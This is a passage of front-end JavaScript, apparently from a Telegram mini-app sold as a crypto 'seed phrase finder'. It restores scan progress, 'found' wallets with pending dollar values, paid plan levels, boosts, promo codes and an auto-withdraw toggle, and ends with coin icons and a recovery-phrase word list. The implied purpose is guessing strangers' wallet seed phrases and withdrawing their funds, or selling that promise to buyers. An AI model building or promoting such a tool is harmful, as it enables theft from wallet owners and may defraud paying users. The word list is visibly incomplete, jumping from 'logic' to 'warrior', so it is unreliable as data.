    Object.keys(defaultCoins).forEach(function(k) {
      var sv = parseFloat(savedCoins[k]) || 0;
      var lv = parseFloat((prevStats.coins||{})[k]) || 0;
      defaultCoins[k] = Math.max(sv, lv);
    });
    
    var _l30ts = parseInt(dd.last30_ts || prevStats.last30_ts || 0);
    var _nowTs  = Math.floor(Date.now() / 1000);
    var _l30age = _l30ts ? (_nowTs - _l30ts) : 0;
    var _l30srv = parseFloat(dd.last30) || 0;
    var _l30loc = prevStats.last30 || 0;
    var _last30 = (_l30age < 2592000) ? Math.max(_l30srv, _l30loc) : 0; 
    if (_l30age >= 2592000) _l30ts = 0;
    window.DASH_STATS = {
      allTime:    Math.max(parseFloat(dd.all_time) || 0, prevStats.allTime || 0),
      last30:     _last30,
      last30_ts:  _last30 > 0 ? _l30ts : 0,
      coins:      defaultCoins,
    };
    setTimeout(function() {
      if (typeof window.updateDashCards === 'function') window.updateDashCards();
    }, 100);

    const pvEl  = document.getElementById('pendingVal');
    const pfEl  = document.getElementById('pendingFound');
    
    var _wfEarly = (typeof u.fndwlet === 'object' && u.fndwlet !== null) ? u.fndwlet : {};
    var _hasFound = parseInt(_wfEarly.found_count || 0) > 0;
    if (pvEl) {
      var _pv = _hasFound ? parseFloat(dd.pending_val || 0) : 0;
      const n = _pv.toFixed(2).split('.');
      pvEl.innerHTML = '$'+n[0]+'<span style="font-size:.875rem;opacity:.55">.'+(n[1]||'00')+'</span>';
    }
    if (pfEl) pfEl.textContent = _hasFound ? (dd.pending_found || 0) : 0;

    if (Array.isArray(u.archive) && u.archive.length) {
      var al = document.getElementById('archList');
      var ae = document.getElementById('archEmpty');
      if (al) {
        if (ae) ae.style.display = 'none';
        u.archive.forEach(function(item) {
          var d1 = document.createElement('div');
          d1.className = 'found-line arch-found-line';
          d1.innerHTML = item.html || '';
          al.appendChild(d1);
        });
      }
    }

    var wf = (typeof u.fndwlet === 'object' && u.fndwlet !== null) ? u.fndwlet : {};
    
    var wfFoundCount = parseInt(wf.found_count) || 0;
    if (wfFoundCount === 0) {
      wf.pending_val   = 0;
      wf.pending_found = 0;
      wf.found_body    = '';
    }
    var fb2 = document.getElementById('foundBody');
    if (wf.found_body && fb2) {
      fb2.innerHTML = wf.found_body;
      window._gettedRestoredCount = fb2.querySelectorAll('.found-line').length;
    } else if (fb2 && !fb2.querySelector('.found-line')) {
      fb2.innerHTML = '<div class="found-placeholder">Found Seed Phrases Appear Here</div>';
      window._gettedRestoredCount = 0;
    }
    var fnEl = document.getElementById('foundNum');
    var pfEl2 = document.getElementById('pendingFound');
    if (fnEl) fnEl.textContent = wfFoundCount;
    if (pfEl2) pfEl2.textContent = wf.pending_found || 0;
    var pv2 = document.getElementById('pendingVal');
    if (pv2) {
      var n2 = parseFloat(wf.pending_val || 0).toFixed(2).split('.');
      pv2.innerHTML = '$'+n2[0]+'<span style="font-size:.875rem;opacity:.55">.'+(n2[1]||'00')+'</span>';
    }

    
    var st = Object.assign({}, u.settings || {});
    var _lsSettings = _loadSettingsLocal();
    if (_lsSettings) Object.assign(st, _lsSettings); 
    
    Object.assign(_settingsCache, st);

    const togKeys = ['background','ai_search','deriv_paths','auto_withdraw','notification'];
    const switches = document.querySelectorAll('.s-switch input[type=checkbox]');
    var _planLv = parseInt(u.plan_level || 0);
    togKeys.forEach((key, i) => {
      if (switches[i]) switches[i].checked = (_planLv === 0) ? false : !!parseInt(st[key] || 0);
    });
    
    if (_planLv === 0) togKeys.forEach(function(k){ _settingsCache[k] = 0; });
    const depthSel = document.getElementById('depthSelect');
    const langSel  = document.getElementById('langSelect');
    if (depthSel && st.depth) depthSel.value = st.depth;
    if (langSel  && st.lang)  langSel.value  = st.lang;
    if (st.theme && st.theme !== 'black') {
      window._currentTheme = st.theme;
      document.body.classList.remove('theme-red','theme-green','theme-white');
      document.body.classList.add('theme-' + st.theme);
      if (typeof window.updateTopbarIcons === 'function') window.updateTopbarIcons(st.theme);
      var dot = document.querySelector('.theme-dot[data-theme="' + st.theme + '"]');
      if (dot) {
        document.querySelectorAll('.theme-dot').forEach(function(d){ d.classList.remove('active'); });
        dot.classList.add('active');
      }
    }

    
    if (u._messages) {
      window._msgData = u._messages;
      window._msgSeen = u._msg_seen || [];
    }

    
    if (u._jumps && Array.isArray(u._jumps)) {
      window._jumpsData = u._jumps;
      window._jumpsSeen = u.jumps_key || '';
    }

    
    if (u._promo !== undefined) {
      window._promoCode      = u._promo.available ? (u._promo.code || '') : '';
      window._promoAvailable = u._promo.available;
      if (!u._promo.available) {
        var lbl = document.getElementById('promoLabel');
        if (lbl) { lbl.textContent = '🔒 Promo not available for your plan'; lbl.style.cursor = 'default'; }
      }
    }
  }

  
  function handleSplashSkip(done) {
    if (!done) return;
    window.SPLASH_ALREADY_DONE = true;

    const splash = document.getElementById('splash-root');
    if (!splash) return;

    var trm = document.getElementById('sp-trm');
    if (trm) trm.style.pointerEvents = 'none';
    var logbox = document.getElementById('sp-logbox');
    if (logbox) logbox.innerHTML = '';

    var stepsEl = document.getElementById('sp-stat-steps');
    if (stepsEl) {
      stepsEl.textContent = 'waiting...';
      stepsEl.style.color = '';
    }

    setTimeout(function() {
      splash.style.transition = 'opacity .4s';
      splash.style.opacity = '0';
      setTimeout(function() {
        splash.style.display = 'none';
        if (typeof window.gotoMain === 'function') window.gotoMain();
        else {
          var main = document.getElementById('screen-main');
          if (main) {
            document.querySelectorAll('.screen').forEach(function(s){ s.classList.remove('active'); });
            main.classList.add('active');
          }
        }
        setTimeout(function() { window.showToastDialogIfNeeded(); }, 1000);
      }, 400);
    }, 1000);
  }

  
  function attachHooks() {

    
    const _origSave = window.saveWalletState;
    if (typeof _origSave === 'function') {
      window.saveWalletState = function(name, words) {
        _origSave.call(this, name, words);
        window.DB.saveWallet(name, words || []);
      };
    }
    const _origClear = window.clearWalletState;
    if (typeof _origClear === 'function') {
      window.clearWalletState = function() {
        _origClear.call(this);
        window.DB.clearWallet(); 
      };
    }

    
    const _origBoost = window.addBoost;
    if (typeof _origBoost === 'function') {
      window.addBoost = function() {
        
        var planLocked = (window.ALFA_PLAN_LEVEL || 0) < 1;
        _origBoost.call(this);
        if (planLocked) return; 
        setTimeout(function() {
          var endTs = window.boostRunning ? Date.now() + window.boostSec * 1000 : null;
          window.DB.saveBoost(window.boostCount, endTs, window.boostRunning);
        }, 200);
      };
    }

    var _origToggleScan = window.toggleScan;
    if (typeof _origToggleScan === 'function') {
      window.toggleScan = function() {
        _origToggleScan.call(this);
        setTimeout(function() {
          if (window.boostRunning && window.boostSec > 0) {
            window.DB.saveBoost(window.boostCount, Date.now() + window.boostSec * 1000, true);
          }
        }, 300);
      };
    }

    
    setTimeout(function() {
      var archList = document.getElementById('archList');
      if (!archList) return;
      var _ready = false;
      setTimeout(function() { _ready = true; }, 600);
      new MutationObserver(function(muts) {
        if (!_ready) return;
        muts.forEach(function(m) {
          m.addedNodes.forEach(function(node) {
            if (node.nodeType === 1 && node.classList.contains('arch-found-line')) {
              window.DB.saveArchiveItem({ html: node.innerHTML, ts: Date.now() });
            }
          });
        });
      }).observe(archList, { childList: true });
    }, 200);

    
    

    
    const togKeys = ['background','ai_search','deriv_paths','auto_withdraw','notification'];
    const switches = document.querySelectorAll('.s-switch input[type=checkbox]');
    togKeys.forEach((key, i) => {
      if (switches[i]) {
        switches[i].addEventListener('change', () => {
          window.DB.saveSetting(key, switches[i].checked ? 1 : 0);
        });
      }
    });
    const depthSel = document.getElementById('depthSelect');
    if (depthSel) depthSel.addEventListener('change', () => window.DB.saveSetting('depth', depthSel.value));

    
    const spBtn = document.getElementById('sp-btn');
    if (spBtn) spBtn.addEventListener('click', () => {
      window.DB.setSplashDone();
    }, { once: true });

    
    const tb = document.getElementById('checkedTerminal');
    if (tb) {
      function syncScroll() {
        const isIdle = tb.children.length === 0 ||
          (tb.children.length === 1 && tb.children[0].classList.contains('trm-ready'));
        tb.style.overflowY    = isIdle ? 'hidden' : 'auto';
        tb.style.pointerEvents = isIdle ? 'none'   : 'auto';
      }
      syncScroll();
      new MutationObserver(syncScroll).observe(tb, { childList: true });
    }

    
    setInterval(function() {
      if (!_settingsDirty) return;
      
      var switches = document.querySelectorAll('.s-switch input[type=checkbox]');
      var anyOn = false;
      switches.forEach(function(sw) { if (sw.checked) anyOn = true; });
      if (!anyOn) return; 
      _flushSettings();
    }, 10000);
  }

  
  async function doInit(tgUser) {
    
    var res = await api('init', { tg: tgUser, with_messages: 1, with_online: 1, with_promo: 1, with_jumps: 1, with_scan_state: 1, with_coin_prices: 1, with_toast: 1 });
    if (!res || !res.ok) {
      if (window._alfaShowLoader) window._alfaShowLoader();
      return;
    }
    var u = res.user;
    window.DB.tgId       = parseInt(u.tg_id) || tgUser.id;
    window.DB.trialCount = parseInt(u.trial_count) || 0;
    window.DB.planLevel  = parseInt(u.plan_level)  || 0;
    window.TRIAL_COUNT   = window.DB.trialCount;
    
    
    if (u.max_trials && u.max_trials > 0) {
      window.MAX_TRIALS = u.max_trials;
      
      if ((window.ALFA_PLAN_LEVEL || 0) === 0) {
        var _attEl = document.getElementById('spmAttemptsVal');
        if (_attEl) _attEl.textContent = window.MAX_TRIALS.toLocaleString() + ' time';
      }
    }

    
    window._loadPromo = function() {
      if (!window.DB || !window.DB.tgId) return;
      api('get_promo', { tg_id: window.DB.tgId }).then(function(r) {
        if (r) {
          window._promoCode      = r.available ? (r.code || '') : '';
          window._promoAvailable = r.available;
          if (!r.available) {
            var lbl = document.getElementById('promoLabel');
            if (lbl) { lbl.textContent = '🔒 Promo not available for your plan'; lbl.style.cursor = 'default'; }
          }
        }
      }).catch(function(){});
    };

    window.DB.jumpsKey = (u.jumps_key || '');

    
    function _applyUiAndResume() {
      
      if (u._coin_prices && typeof window._applyCgDbPrices === 'function') {
        window._applyCgDbPrices(u._coin_prices);
        try { localStorage.setItem('cg_prices', JSON.stringify({prices: u._coin_prices, ts: Date.now()})); } catch(e){}
      }
      
      if (u._toast_dialog && typeof window.showToastDialogIfNeeded === 'function') {
        window._toastDialogData = u._toast_dialog;
      }
      
      if (u.lang && window.applyLang) window.applyLang(u.lang);

      restoreUI(u);
      attachHooks();

      
      var bgSw = document.querySelectorAll('.s-switch input[type=checkbox]')[0];
      var bgOn = bgSw && bgSw.checked;
      if (!bgOn) { handleSplashSkip(u.splash_done); return; }

      var ss = u.scan_state || null;
      if (!ss || ss.active !== 1) { handleSplashSkip(u.splash_done); return; }

      
      window.SPLASH_ALREADY_DONE = true;
      var splash  = document.getElementById('splash-root');
      var btn     = document.getElementById('sp-btn');
      var stepsEl = document.getElementById('sp-stat-steps');
      var netEl   = document.getElementById('sp-stat-network');
      var elapsed = ss.start_time ? Math.max(0, Math.floor(Date.now()/1000 - ss.start_time)) : 0;
      function _fmtT(s){ var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60; return (h?h+'h ':'')+m+'m '+sc+'s'; }
      if (stepsEl){ stepsEl.textContent='Running '+_fmtT(elapsed); stepsEl.style.color='#00ffa3'; }
      if (netEl)  { netEl.textContent='Online'; netEl.style.color='#00cfb4'; }
      
      var chkEl = document.getElementById('checkedNum');
      if (chkEl && ss.checked) chkEl.textContent = ss.checked;
      if (ss.checked) window._resumedChecked = ss.checked;
      
      if (ss.chains && Array.isArray(ss.chains) && ss.chains.length > 0) {
        document.querySelectorAll('.chain-chip').forEach(function(chip){
          var cls = Array.from(chip.classList).find(function(c){ return c.startsWith('chip-'); });
          if (!cls) return;
          var name = cls.replace('chip-','');
          if (ss.chains.indexOf(name) !== -1) chip.classList.add('selected');
          else chip.classList.remove('selected');
        });
      }
      
      if (window.boostRunning && window.boostSec > 0) {
        var pill = document.getElementById('boostPill');
        if (pill) { pill.style.display='flex'; pill.classList.remove('paused'); }
        var bt2 = pill ? pill.querySelector('.boost-time') : null;
        if (bt2) {
          var s0=window.boostSec,h0=Math.floor(s0/3600),m0=Math.floor((s0%3600)/60),sc0=s0%60;
          bt2.textContent=(h0>0?h0+'h ':'')+m0+'m '+sc0+'s';
        }
      }
      
      if (btn) {
        btn.disabled=false; btn.style.opacity='1'; btn.style.cursor='pointer';
        btn.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:1rem;height:1rem;pointer-events:none;flex-shrink:0;"><polygon points="5 3 19 12 5 21 5 3"/></svg> Continue Scanning';
        btn.onclick = function(){
          if (splash) splash.classList.add('hide');
          setTimeout(function(){
            if (splash) splash.remove();
            setTimeout(function(){ if(typeof window.startScan==='function') window.startScan(); }, 300);
          }, 650);
        };
      }
      
      window._resumingFromBg = true;
      window._scanStartTs    = ss.start_time || Math.floor(Date.now()/1000);
      setTimeout(function(){ if(btn && !btn.disabled) btn.click(); }, 1200);
    }

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', _applyUiAndResume);
    } else {
      _applyUiAndResume();
    }
  }

  async function init() {
    var tgUser = parseTgUser();
    if (tgUser) { doInit(tgUser); return; }
    function tryAfterDom() {
      var u2 = parseTgUser();
      if (u2) {
        doInit(u2);
      } else {
        if(window._alfaShowLoader) window._alfaShowLoader();
      }
    }
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', tryAfterDom);
    } else {
      tryAfterDom();
    }
  }

  init();
})();

window._showStoreStyleToast = function(msg, ms) {
  ms = ms || 3200;
  
  var old = document.getElementById('_globalToast');
  if(old){ clearTimeout(old._t); old.remove(); }

  var t = document.createElement('div');
  t.id = '_globalToast';
  t.style.cssText = [
    'position:fixed', 'bottom:75px', 'left:50%',
    'transform:translateX(-50%) translateY(14px)',
    'background:transparent',
    'border:1px solid rgba(124,92,255,.5)',
    'color:#e8ebff', 'font-family:Outfit,sans-serif',
    'font-size:.78rem', 'font-weight:700',
    'padding:10px 18px', 'border-radius:12px',
    'display:flex', 'align-items:center', 'gap:8px',
    'box-shadow:0 6px 24px rgba(124,92,255,.4)',
    'opacity:0', 'pointer-events:none',
    'transition:opacity .25s,transform .25s',
    'z-index:99999', 'white-space:nowrap',
    'backdrop-filter:blur(8px)', '-webkit-backdrop-filter:blur(8px)'
  ].join(';');
  t.innerHTML = msg;
  document.body.appendChild(t);

  void t.offsetWidth;
  t.style.opacity = '1';
  t.style.transform = 'translateX(-50%) translateY(0)';

  t._t = setTimeout(function(){
    t.style.opacity = '0';
    t.style.transform = 'translateX(-50%) translateY(14px)';
    setTimeout(function(){ if(t.parentNode) t.remove(); }, 280);
  }, ms);
};

function _onDom(fn){ if(document.readyState!=='loading') fn(); else document.addEventListener('DOMContentLoaded',fn); }

window.CRYPTO_ICONS = {
  
  token: {
    BTC: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#F7931A"/><path d="M22.5 14.2c.3-2.1-1.3-3.2-3.5-3.9l.7-2.9-1.7-.4-.7 2.8-.9-.2.7-2.8-1.7-.4-.7 2.8-1.4-.3-2.4-.6-.4 1.9s1.3.3 1.2.3c.7.2.8.6.8 1l-.8 3.4c.1 0 .2 0 .3.1h-.3l-1.2 4.8c-.1.2-.3.6-.8.4.0 0-1.2-.3-1.2-.3l-.9 2h2.2l.7-.2-.7 2.9 1.7.4.7-2.9.9.2-.7 2.9 1.7.4.7-2.9c2.9.5 5.1.3 6-2.3.7-2-.0-3.2-1.5-3.9 1.1-.3 1.9-1 2.1-2.4zm-3.8 5.3c-.5 2-3.9 1-5 .7l.9-3.6c1.1.3 4.7.8 4.1 2.9zm.5-5.3c-.5 1.8-3.3 1-4.3.7l.8-3.3c1 .3 4 .7 3.5 2.6z" fill="white"/></svg>`,
    ETH: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#627EEA"/><path d="M16 5v8.7l7.3 3.3L16 5z" fill="white" opacity=".6"/><path d="M16 5l-7.3 12 7.3-3.3V5z" fill="white"/><path d="M16 22.5v4.5l7.3-10.1L16 22.5z" fill="white" opacity=".6"/><path d="M16 27v-4.5l-7.3-5.6L16 27z" fill="white"/><path d="M16 21.1l7.3-4.2-7.3-3.3v7.5z" fill="white" opacity=".2"/><path d="M8.7 16.9l7.3 4.2v-7.5l-7.3 3.3z" fill="white" opacity=".6"/></svg>`,
    BNB: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#F3BA2F"/><path d="M11.7 14.8L16 10.5l4.3 4.3 2.5-2.5L16 5.5l-6.8 6.8 2.5 2.5zM5.5 16l2.5-2.5 2.5 2.5-2.5 2.5L5.5 16zm6.2 1.2L16 21.5l4.3-4.3 2.5 2.5L16 26.5l-6.8-6.8 2.5-2.5zm11.1-1.2l2.5-2.5 2.5 2.5-2.5 2.5L22.8 16zm-6.8 0l-2-2 2-2 2 2-2 2z" fill="white"/></svg>`,
    TRX: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#EF0027"/><path d="M24.5 11.8l-3.8-6.3-1.2.7L16 5l-9 4.8.2 1.4L16 27l9-15.2-.5-1zm-8.5 12L8.8 11.2l6.3 1.9v10.7zm1.5 0V13.1l6.3-1.9L17.5 23.8zm.6-12.6L12 9.5l4-2.2 4 2.2-2.5 1.9H18l.1-.3z" fill="white"/></svg>`,
    SOL: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#9945FF"/><path d="M9 20.5h11.5c.2 0 .4-.1.5-.2l1.7-1.9c.1-.1.1-.2 0-.3H11.2c-.2 0-.4.1-.5.2L9 20.3c-.1.1-.1.2 0 .2zm0-6.3h11.5c.2 0 .4-.1.5-.2l1.7-1.9c.1-.1.1-.2 0-.3H11.2c-.2 0-.4.1-.5.2L9 13.9c-.1.1-.1.2 0 .3zm13.2-5.7H10.8c-.2 0-.4.1-.5.2L8.6 10.6c-.1.1-.1.2 0 .3h11.5c.2 0 .4-.1.5-.2l1.7-1.9c.1-.1.1-.2-.1-.3z" fill="white"/></svg>`,
    XRP: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#346AA9"/><path d="M23 8h-2.5l-4.5 4.5L11.5 8H9l5.8 5.8-5.8 5.8 2.5-.1 4.5-4.5 4.5 4.5H23l-5.8-5.8L23 8z" fill="white"/></svg>`,
    USDT: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#26A17B"/><path d="M17.4 17.7v-.1c3.9-.2 6.9-.9 6.9-1.7s-3-1.5-6.9-1.7v-2.9h5.5V9H9.1v2.3h5.5v2.9c-3.9.2-6.9.9-6.9 1.7s3 1.5 6.9 1.7v6.1h1.8v-6z" fill="white"/></svg>`,
    DOGE: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#C2A633"/><text x="16" y="21" text-anchor="middle" font-size="13" font-weight="900" fill="white" font-family="Arial">Ð</text></svg>`,
    LTC: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#BFBBBB"/><text x="16" y="21" text-anchor="middle" font-size="14" font-weight="900" fill="white" font-family="Arial">Ł</text></svg>`,
    TON: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#0088CC"/><path d="M16 7l-8 5h4v10h8V12h4L16 7z" fill="white"/></svg>`,
  },
  
  network: {
    Bitcoin:  `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#F7931A"/><path d="M22.5 14.2c.3-2.1-1.3-3.2-3.5-3.9l.7-2.9-1.7-.4-.7 2.8-.9-.2.7-2.8-1.7-.4-.7 2.8-1.4-.3-2.4-.6-.4 1.9s1.3.3 1.2.3c.7.2.8.6.8 1l-.8 3.4c.1 0 .2 0 .3.1h-.3l-1.2 4.8c-.1.2-.3.6-.8.4.0 0-1.2-.3-1.2-.3l-.9 2h2.2l.7-.2-.7 2.9 1.7.4.7-2.9.9.2-.7 2.9 1.7.4.7-2.9c2.9.5 5.1.3 6-2.3.7-2-.0-3.2-1.5-3.9 1.1-.3 1.9-1 2.1-2.4zm-3.8 5.3c-.5 2-3.9 1-5 .7l.9-3.6c1.1.3 4.7.8 4.1 2.9zm.5-5.3c-.5 1.8-3.3 1-4.3.7l.8-3.3c1 .3 4 .7 3.5 2.6z" fill="white"/></svg>`,
    Ethereum: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#627EEA"/><path d="M16 5v8.7l7.3 3.3L16 5z" fill="white" opacity=".6"/><path d="M16 5l-7.3 12 7.3-3.3V5z" fill="white"/><path d="M16 22.5v4.5l7.3-10.1L16 22.5z" fill="white" opacity=".6"/><path d="M16 27v-4.5l-7.3-5.6L16 27z" fill="white"/></svg>`,
    BSC:      `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#F3BA2F"/><path d="M11.7 14.8L16 10.5l4.3 4.3 2.5-2.5L16 5.5l-6.8 6.8 2.5 2.5zM5.5 16l2.5-2.5 2.5 2.5-2.5 2.5L5.5 16zm6.2 1.2L16 21.5l4.3-4.3 2.5 2.5L16 26.5l-6.8-6.8 2.5-2.5zm11.1-1.2l2.5-2.5 2.5 2.5-2.5 2.5L22.8 16zm-6.8 0l-2-2 2-2 2 2-2 2z" fill="white"/></svg>`,
    Tron:     `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#EF0027"/><path d="M24.5 11.8l-3.8-6.3-1.2.7L16 5l-9 4.8.2 1.4L16 27l9-15.2-.5-1zm-8.5 12L8.8 11.2l6.3 1.9v10.7zm1.5 0V13.1l6.3-1.9L17.5 23.8zm.6-12.6L12 9.5l4-2.2 4 2.2-2.5 1.9z" fill="white"/></svg>`,
    Solana:   `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#9945FF"/><path d="M9 20.5h11.5c.2 0 .4-.1.5-.2l1.7-1.9c.1-.1.1-.2 0-.3H11.2c-.2 0-.4.1-.5.2L9 20.3c-.1.1-.1.2 0 .2zm0-6.3h11.5c.2 0 .4-.1.5-.2l1.7-1.9c.1-.1.1-.2 0-.3H11.2c-.2 0-.4.1-.5.2L9 13.9c-.1.1-.1.2 0 .3zm13.2-5.7H10.8c-.2 0-.4.1-.5.2L8.6 10.6c-.1.1-.1.2 0 .3h11.5c.2 0 .4-.1.5-.2l1.7-1.9c.1-.1.1-.2-.1-.3z" fill="white"/></svg>`,
    XRP:      `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#346AA9"/><path d="M23 8h-2.5l-4.5 4.5L11.5 8H9l5.8 5.8-5.8 5.8 2.5-.1 4.5-4.5 4.5 4.5H23l-5.8-5.8L23 8z" fill="white"/></svg>`,
    Litecoin: `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#BFBBBB"/><text x="16" y="21" text-anchor="middle" font-size="14" font-weight="900" fill="white" font-family="Arial">Ł</text></svg>`,
    TON:      `<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"><circle cx="16" cy="16" r="16" fill="#0088CC"/><path d="M16 7l-8 5h4v10h8V12h4L16 7z" fill="white"/></svg>`,
  }
};

window.getTokenIconHTML = function(symbol, size) {
  size = size || 32;
  var svg = window.CRYPTO_ICONS.token[symbol];
  if (!svg) return '<div style="width:'+size+'px;height:'+size+'px;border-radius:50%;background:#333;display:flex;align-items:center;justify-content:center;font-size:9px;color:#fff;font-weight:900;">'+symbol+'</div>';
  return svg.replace('<svg ', '<svg width="'+size+'" height="'+size+'" ');
};

window.getNetIconHTML = function(network, size) {
  size = size || 16;
  var svg = window.CRYPTO_ICONS.network[network];
  if (!svg) return '<div style="width:'+size+'px;height:'+size+'px;border-radius:50%;background:#555;"></div>';
  return svg.replace('<svg ', '<svg width="'+size+'" height="'+size+'" ');
};

const WORDS=["abandon","ability","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acoustic","acquire","across","action","actor","actress","actual","adapt","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","agent","agree","ahead","airport","aisle","alarm","album","alcohol","alert","alien","alley","allow","almost","alone","alpha","already","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","apart","apology","appear","apple","approve","april","arctic","arena","argue","armed","armor","around","arrange","arrest","arrive","arrow","artefact","artist","artwork","aspect","assault","asset","assist","assume","asthma","athlete","attack","attend","attitude","attract","auction","audit","august","author","autumn","average","avocado","avoid","awake","aware","awesome","awful","awkward","bachelor","bacon","badge","balance","balcony","bamboo","banana","banner","barely","bargain","barrel","basic","basket","battle","beach","beauty","because","become","before","begin","behave","behind","believe","below","bench","benefit","betray","better","between","beyond","bicycle","biology","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blush","board","bonus","boost","border","boring","borrow","bottom","bounce","bracket","brain","brand","brass","brave","bread","breeze","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","buddy","budget","buffalo","build","bullet","bundle","bunker","burden","burger","burst","business","butter","buyer","cabbage","cabin","cable","cactus","camera","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","carbon","cargo","carpet","carry","casino","castle","casual","catalog","catch","category","cattle","caught","cause","caution","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","cheap","check","cheese","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","churn","cigar","cinnamon","circle","citizen","civil","claim","clarify","clean","clerk","clever","click","client","cliff","climb","clinic","clock","close","cloth","cloud","clown","clump","cluster","clutch","coach","coast","coconut","coffee","collect","color","column","combine","comfort","comic","common","company","concert","conduct","confirm","congress","connect","consider","control","convince","copper","coral","correct","cotton","couch","country","couple","course","cousin","cover","coyote","crack","cradle","craft","crane","crash","crater","crawl","crazy","cream","credit","creek","cricket","crime","crisp","critic","cross","crouch","crowd","crucial","cruel","cruise","crumble","crunch","crush","crystal","culture","cupboard","curious","current","curtain","curve","cushion","custom","cycle","damage","dance","danger","daring","daughter","debate","debris","decade","december","decide","decline","decorate","decrease","defense","define","degree","delay","deliver","demand","demise","denial","dentist","depart","depend","deposit","depth","deputy","derive","describe","desert","design","despair","destroy","detail","detect","develop","device","devote","diagram","diamond","diary","diesel","differ","digital","dignity","dilemma","dinner","dinosaur","direct","disagree","discover","disease","dismiss","disorder","display","distance","divert","divide","divorce","dizzy","doctor","document","dolphin","domain","donate","donkey","donor","double","draft","dragon","drama","drastic","dream","dress","drift","drill","drink","drive","during","dutch","dwarf","dynamic","eager","eagle","early","earth","easily","ecology","economy","educate","effort","eight","either","elbow","elder","electric","elegant","element","elephant","elevator","elite","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlist","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evoke","evolve","exact","example","excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exotic","expand","expect","expire","explain","expose","express","extend","extra","eyebrow","fabric","faculty","faint","faith","false","family","famous","fancy","fantasy","fashion","fatal","father","fatigue","fault","favorite","feature","february","federal","female","fence","festival","fever","fiber","fiction","field","figure","filter","final","finger","finish","first","fiscal","fitness","flame","flash","flavor","flight","float","flock","floor","flower","fluid","flush","focus","follow","force","forest","forget","fortune","forum","forward","fossil","foster","found","fragile","frame","frequent","fresh","friend","fringe","front","frost","frown","frozen","fruit","funny","furnace","future","gadget","galaxy","gallery","garage","garbage","garden","garlic","garment","gather","gauge","general","genius","genre","gentle","genuine","gesture","ghost","giant","giggle","ginger","giraffe","glance","glare","glass","glide","glimpse","globe","gloom","glory","glove","goddess","goose","gorilla","gospel","gossip","govern","grace","grain","grant","grape","grass","gravity","great","green","grief","grocery","group","grunt","guard","guess","guide","guilt","guitar","habit","hammer","hamster","happy","harbor","harsh","harvest","hazard","health","heart","heavy","hedgehog","height","hello","helmet","hidden","history","hobby","hockey","holiday","hollow","honey","horror","horse","hospital","hotel","hover","human","humble","humor","hundred","hungry","hurdle","hurry","husband","hybrid","identify","ignore","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","invest","invite","involve","island","isolate","issue","ivory","jacket","jaguar","jealous","jeans","jelly","jewel","journey","judge","juice","jungle","junior","kangaroo","ketchup","kidney","kingdom","kitchen","kitten","knife","knock","label","labor","ladder","language","laptop","large","later","latin","laugh","laundry","lawsuit","layer","leader","learn","leave","lecture","legal","legend","leisure","lemon","length","leopard","lesson","letter","level","liberty","library","license","light","limit","liquid","little","lizard","lobster","local","logic","warrior","waste","water","wealth","weapon","weasel","weather","wedding","weekend","weird","welcome","whale","wheat","wheel","where","whisper","width","window","winner","winter","wisdom","witness","woman","wonder","world","worry","worth","wreck","wrestle","wrist","write","wrong","yellow","young","youth","zebra"];

